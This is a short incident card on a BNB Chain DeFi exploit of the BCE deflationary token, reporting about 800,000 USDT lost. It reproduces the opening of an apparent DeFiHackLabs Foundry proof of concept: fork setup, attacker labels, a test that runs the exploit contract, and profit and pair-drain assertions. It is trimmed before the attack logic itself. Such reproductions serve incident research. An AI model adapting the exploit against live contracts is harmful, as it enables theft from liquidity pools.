# [?] BCE - Deflationary Token Logic Error

## Summary
Severity: Unknown
Chain: BNB Chain
Component: bce
Published: 2026-03-23
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/bce_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~800,000 USDT

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 88_215_292;
        vm.createSelectFork("bsc", forkBlock);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(BCE, "BCE");
        vm.label(BCE_USDT_PAIR, "BCE/USDT Pair");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(MOOLAH, "Moolah Flash Lender");
        vm.label(VENUS_COMPTROLLER, "Venus Comptroller");
    }

    function testExploit() public {
        uint256 attackerUsdtBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        uint256 pairUsdtBefore = IERC20(USDT_TOKEN).balanceOf(BCE_USDT_PAIR);

        BCEExploit replacement = new BCEExploit();
        vm.etch(ATTACK_CONTRACT, address(replacement).code);

        vm.prank(ATTACKER);
        IBCEExploit(ATTACK_CONTRACT).execute();

        uint256 attackerUsdtProfit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerUsdtBefore;
        uint256 pairUsdtAfter = IERC20(USDT_TOKEN).balanceOf(BCE_USDT_PAIR);

        assertGt(attackerUsdtProfit, 600_000 ether);
        assertLt(pairUsdtAfter, pairUsdtBefore / 1_000_000);
    }
}

contract BCEExploit {
    receive() external payable {}

    function execute() external {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/bce_exp.sol_
